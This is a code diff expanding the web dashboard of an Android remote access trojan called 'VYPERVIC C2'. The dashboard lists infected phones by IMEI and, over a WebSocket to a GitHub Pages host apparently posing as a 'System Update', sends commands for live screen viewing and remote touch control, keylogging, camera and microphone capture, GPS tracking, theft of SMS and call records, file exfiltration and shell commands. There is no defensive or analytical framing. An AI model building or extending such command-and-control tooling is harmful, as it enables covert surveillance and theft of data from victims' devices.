@@ -3,41 +3,192 @@
 <head>
     <title>VYPERVIC C2 Dashboard</title>
     <style>
-        body { background: #1a1a1a; color: #00ff00; font-family: monospace; }
-        .device { background: #333; padding: 10px; margin: 5px; cursor: pointer; }
-        .features { display: none; }
-        #screen { width: 100%; height: 600px; border: 2px solid #00ff00; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(45deg, #000, #001100); 
+            color: #00ff41; 
+            font-family: 'Courier New', monospace; 
+            min-height: 100vh;
+        }
+        .header { 
+            text-align: center; 
+            padding: 20px; 
+            background: rgba(0,255,65,0.1); 
+            border-bottom: 2px solid #00ff41;
+        }
+        .devices { display: flex; flex-wrap: wrap; padding: 20px; }
+        .device { 
+            background: rgba(0,255,65,0.1); 
+            border: 2px solid #00ff41; 
+            border-radius: 10px; 
+            padding: 15px; 
+            margin: 10px; 
+            cursor: pointer; 
+            transition: all 0.3s;
+            min-width: 250px;
+        }
+        .device:hover { background: rgba(0,255,65,0.3); transform: scale(1.05); }
+        .device.active { background: rgba(255,0,0,0.3); border-color: #ff0040; }
+        .features { 
+            display: none; 
+            position: fixed; 
+            top: 0; right: 0; 
+            width: 400px; 
+            height: 100vh; 
+            background: rgba(0,0,0,0.95); 
+            padding: 20px; 
+            overflow-y: auto;
+            z-index: 1000;
+        }
+        .features.active { display: block; }
+        .feature { 
+            background: rgba(0,255,65,0.2); 
+            margin: 10px 0; 
+            padding: 15px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            transition: 0.3s;
+        }
+        .feature:hover { background: rgba(0,255,65,0.4); }
+        #screen { 
+            width: calc(100vw - 420px); 
+            height: 80vh; 
+            border: 3px solid #00ff41; 
+            background: #111;
+            margin: 20px;
+        }
+        .rename { background: none; border: 1px solid #00ff41; color: #00ff41; padding: 5px 10px; margin-left: 10px; cursor: pointer; }
+        .status { font-size: 12px; color: #888; }
     </style>
 </head>
 <body>
-    <h1>🔥 VYPERVIC C2 - Online Devices</h1>
-    <div id="devices"></div>
+    <div class="header">
+        <h1>🔥 VYPERVIC C2 DASHBOARD</h1>
+        <div>Online Devices: <span id="onlineCount">0</span></div>
+    </div>
     
+    <div class="devices" id="devices"></div>
+    <canvas id="screen" onclick="toggleControl()"></canvas>
+    
+    <div class="features" id="features">
+        <h3 id="deviceName">Select Device</h3>
+        <div class="feature" onclick="startScreen()">📱 Live Screen + Control</div>
+        <div class="feature" onclick="startKeylogger()">⌨️ Keylogger</div>
+        <div class="feature" onclick="startCamera()">📸 Camera</div>
+        <div class="feature" onclick="startMic()">🎤 Microphone</div>
+        <div class="feature" onclick="getLocation()">📍 GPS Location</div>
+        <div class="feature" onclick="stealSMS()">💬 SMS & Calls</div>
+        <div class="feature" onclick="exfilFiles()">📂 File Manager</div>
+        <div class="feature" onclick="shellCommand()">💻 Shell Commands</div>
+        <button onclick="closeFeatures()" style="width:100%; margin-top:20px; padding:15px;">Close</button>
+    </div>
+
     <script>
-    const ws = new WebSocket('wss://vypervic001.github.io/VYPERVIC-System-Update/ws');
-    const devices = {};
+    let currentDevice = null;
+    let devices = {};
+    let screenControl = false;
+    let ws = null;
     
-    ws.onmessage = (e) => {
+    // Connect to WebSocket (GitHub Pages proxy needed for WS)
+    function connectWS() {
+        ws = new WebSocket('wss://vypervic001.github.io/C2_SERVER/ws');
+        ws.onopen = () => console.log('C2 WS Connected');
+        ws.onmessage = handleMessage;
+        ws.onclose = () => setTimeout(connectWS, 5000); // Reconnect
+    }
+    
+    function handleMessage(e) {
         const data = JSON.parse(e.data);
-        if(data.type === 'connect') {
-            addDevice(data.imei, data.device);
+        if (data.type === 'device_connect') {
+            addDevice(data.imei, data.model, data.android);
+        } else if (data.type === 'screen_frame') {
+            updateScreen(data.frame); // Base64 image
+        } else if (data.type === 'keystroke') {
+            logKeylog(data.key);
         }
-    };
+    }
     
-    function addDevice(id, name) {
+    function addDevice(imei, model, android) {
+        if (devices[imei]) return;
+        devices[imei] = { model, android, name: model };
+        
         const div = document.createElement('div');
         div.className = 'device';
-        div.innerHTML = `${name} (${id}) <button onclick="rename('${id}')">Rename</button>`;
-        div.onclick = () => showFeatures(id);
+        div.id = `device_${imei}`;
+        div.innerHTML = `
+            <div>${model} (Android ${android})</div>
+            <div class="status">IMEI: ${imei.slice(-8)}</div>
+            <input type="text" placeholder="New name" id="name_${imei}">
+            <button class="rename" onclick="renameDevice('${imei}')">Rename</button>
+        `;
+        div.onclick = (e) => {
+            if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') {
+                selectDevice(imei);
+            }
+        };
         document.getElementById('devices').appendChild(div);
+        updateCount();
     }
     
-    function showFeatures(id) {
-        // Feature drawer animation
-        document.querySelectorAll('.features').forEach(f => f.style.display = 'none');
-        // Live screen + controls
-        document.getElementById('screen').src = `/screen/${id}`;
+    function selectDevice(imei) {
+        currentDevice = imei;
+        document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
+        document.getElementById(`device_${imei}`).classList.add('active');
+        
+        document.getElementById('deviceName').textContent = devices[imei].name;
+        document.getElementById('features').classList.add('active');
+        
+        if (ws) ws.send(JSON.stringify({type: 'select', device: imei}));
     }
+    
+    function renameDevice(imei) {
+        const newName = document.getElementById(`name_${imei}`).value;
+        if (newName) {
+            devices[imei].name = newName;
+            document.getElementById(`device_${imei}`).querySelector('div').firstChild.textContent = newName;
+            if (ws) ws.send(JSON.stringify({type: 'rename', imei, name: newName}));
+        }
+    }
+    
+    function updateCount() {
+        document.getElementById('onlineCount').textContent = Object.keys(devices).length;
+    }
+    
+    function startScreen() {
+        if (ws && currentDevice) {
+            ws.send(JSON.stringify({type: 'screen_start', device: currentDevice}));
+        }
+    }
+    
+    function startKeylogger() {
+        if (ws && currentDevice) ws.send(JSON.stringify({type: 'keylogger_start', device: currentDevice}));
+    }
+    
+    // Other feature commands...
+    function getLocation() { ws.send(JSON.stringify({type: 'gps', device: currentDevice})); }
+    function startCamera() { ws.send(JSON.stringify({type: 'camera', device: currentDevice})); }
+    
+    function toggleControl() {
+        screenControl = !screenControl;
+        // Send control mode to RAT
+    }
+    
+    function closeFeatures() {
+        document.getElementById('features').classList.remove('active');
+        currentDevice = null;
+    }
+    
+    // Touch control for screen
+    document.getElementById('screen').addEventListener('click', (e) => {
+        if (screenControl && currentDevice) {
+            const rect = e.target.getBoundingClientRect();
+            const x = (e.clientX - rect.left) / rect.width * 1080; // Normalize
+            const y = (e.clientY - rect.top) / rect.height * 1920;
+            ws.send(JSON.stringify({type: 'touch', device: currentDevice, x, y}));
+        }
+    });
+    
+    connectWS();
     </script>
 </body>
-</html>
+    </html>
